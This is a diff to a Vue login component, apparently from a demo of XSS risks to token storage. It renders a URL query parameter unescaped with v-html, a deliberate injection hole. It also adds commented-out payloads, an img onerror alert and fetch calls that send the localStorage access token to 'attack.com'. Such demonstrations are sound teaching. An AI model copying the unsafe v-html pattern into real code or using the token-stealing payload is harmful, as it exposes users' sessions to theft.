@@ -2,7 +2,10 @@
 import { ClientTokenBasedHttp } from '@/ClientTokenBasedHttp'
 import { ClientCookieHttpOnly } from '@/ClientCookieHttpOnly'
 import router from '@/router'
+import { useRoute } from 'vue-router'
 
+const route = useRoute();
+const conteudo = route.query.param;
 async function handleSubmit(event: Event) {
   event.preventDefault()
   const formData = new FormData(event.target as HTMLFormElement)
@@ -27,11 +30,22 @@ async function handleSubmit(event: Event) {
   router.push('/protected')
   
 }
+//<img src="x" onerror="alert('XSS!')">
+//<img src="x" onerror="fetch('http://attack.com', {  method: 'POST',  headers: {    'Content-Type': 'application/json',    'Authorization': `Bearer ${localStorage.getItem('accessToken')}`  },})">
+// fetch('http://attack.com', {  method: 'POST',  headers: {    'Content-Type': 'application/json',    'Authorization': `Bearer ${localStorage.getItem('accessToken')}`  },})
+// fetch('http://attack.com', {
+//   method: 'POST',
+//   headers: {
+//     'Content-Type': 'application/json',
+//     'Authorization': `Bearer ${localStorage.getItem('accessToken')}`	
+//   },
+// })
 </script>
 
 <template>
   <main>
     <h1>SPA - Login</h1>
+    <div v-html="conteudo"></div>
     <form @submit="handleSubmit">
       <div>
         <label for="email">email</label>
